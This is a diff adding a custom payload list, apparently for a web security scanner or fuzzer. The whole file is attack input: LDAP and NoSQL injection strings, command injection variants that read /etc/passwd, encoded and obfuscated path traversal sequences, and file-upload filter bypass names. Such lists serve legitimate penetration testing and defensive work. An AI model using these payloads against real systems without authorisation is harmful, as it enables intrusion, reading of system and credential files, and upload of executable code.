@@ -1,0 +1,38 @@
+# Custom payloads for specific testing scenarios
+# Add your custom payloads here, one per line
+
+# LDAP Injection
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+
+# NoSQL Injection
+{"$ne": null}
+{"$ne": ""}
+{"$gt": ""}
+{"$where": "1==1"}
+'; return true; var dummy='
+
+# Command Injection
+; cat /etc/passwd
+| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; dir
+| dir
+`dir`
+$(dir)
+
+# Path Traversal
+../../../etc/passwd
+..\..\..\..\windows\system32\drivers\etc\hosts
+....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# File Upload Bypass
+test.php.jpg
+test.jsp.png
+test.asp.gif
+test.php%00.jpg
+test.php;.jpg
+test.php#.jpg
